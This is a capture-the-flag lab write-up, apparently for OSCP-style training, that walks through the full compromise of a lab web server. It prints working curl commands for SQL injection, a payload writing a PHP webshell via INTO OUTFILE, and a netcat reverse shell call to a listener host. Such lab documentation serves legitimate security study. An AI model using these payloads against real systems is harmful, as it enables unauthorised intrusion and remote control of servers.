# FLAG CAPTURED - Chapter 10 Capstone 2
**Date**: 2025-10-01
**Target**: 192.168.145.48 (animal-world)
**Flag**: `OS{c7956b8848527f9443bdfbf1d125ef1f}`
**Location**: `/var/www/flag.txt`
**Access Level**: www-data

## Complete Attack Chain

### 1. SQL Injection Discovery
- **Vulnerable Parameter**: `mail-list` (POST)
- **Type**: Time-based blind SQL injection
- **Database User**: `gollum@localhost`

### 2. Privilege Discovery
- **Critical Finding**: FILE privilege enabled
- **Impact**: Can read/write files on system

### 3. File System Access
- **Writable Directory**: `/var/www/html/`
- **Method**: MySQL `INTO OUTFILE` statement
- **Column Count**: 6 (discovered via ORDER BY)

### 4. Webshell Deployment
- **Webshell**: `cmd_1759334715.php`
- **Functionality**: Remote command execution via GET parameter

### 5. Reverse Shell
- **Method**: `nc -e /bin/bash`
- **Listener Port**: 443
- **Shell User**: www-data

### 6. Flag Discovery
- **Search Command**: `find /var -name "*flag*" 2>/dev/null`
- **Flag Location**: `/var/www/flag.txt`
- **Permissions**: Readable by www-data

## Timeline
- SQLi Discovery: ~5 minutes
- Column Enumeration: ~2 minutes
- File Write Testing: ~3 minutes
- Webshell Deployment: ~2 minutes
- Reverse Shell: ~1 minute
- Flag Discovery: ~2 minutes
- **Total Time**: ~15 minutes

## Key Techniques Used
1. **ORDER BY** for column enumeration
2. **UNION SELECT** with NULL padding
3. **INTO OUTFILE** for file writing
4. **URL encoding** for special characters
5. **Netcat** for reverse shell
6. **Find** command for flag location

## Commands That Led to Success

```bash
# Column enumeration
curl -X POST http://192.168.145.48/index.php -d "mail-list=test@test.com' ORDER BY 7-- -"

# Webshell deployment
curl -X POST http://192.168.145.48/index.php \
  --data-urlencode "mail-list=test@test.com' UNION SELECT '<?php echo shell_exec(\$_GET[\"c\"]); ?>',NULL,NULL,NULL,NULL,NULL INTO OUTFILE '/var/www/html/cmd_1759334715.php'-- -"

# Reverse shell
curl -G "http://192.168.145.48/cmd_1759334715.php" \
  --data-urlencode "c=nc -e /bin/bash 192.168.45.179 443"

# Flag discovery
find /var -name "*flag*" 2>/dev/null
cat /var/www/flag.txt
```

## Lessons Learned
1. **FILE privilege is powerful** - Leads directly to RCE
2. **Simple payloads work best** - Complex escaping often fails
3. **Always check /var/www/** - Common flag location in web challenges
4. **Column count is critical** - Must match for UNION to work
5. **Persistence via webshell** - Allows re-entry if shell dies

## OSCP Exam Relevance
- Demonstrates SQL injection to code execution
- Shows privilege abuse (FILE)
- Covers web application exploitation
- Includes post-exploitation enumeration
- Complete kill chain from SQLi to flag

---

**Status**: ✅ COMPLETED SUCCESSFULLY